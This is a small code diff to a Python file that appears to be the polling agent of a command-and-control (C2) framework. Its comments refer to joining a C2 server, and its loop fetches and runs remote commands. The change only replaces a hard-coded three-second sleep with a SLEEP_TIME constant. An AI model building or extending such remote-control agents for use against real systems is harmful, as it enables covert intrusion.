@@ -11,6 +11,7 @@ agent_id = None
 REQUEST_TIMEOUT = 30  # seconds for most requests
 UPLOAD_TIMEOUT = 120  # seconds for file uploads
 DOWNLOAD_TIMEOUT = 120  # seconds for file downloads
+SLEEP_TIME = 3
 
 # function to send to server a join request to c2
 def connect():
@@ -157,7 +158,7 @@ def main():
 
     print("[+] Agent running. Polling for commands...")
     while True:
-        time.sleep(3)
+        time.sleep(SLEEP_TIME)
         try:
             commands = check_commands()
             for command in commands:
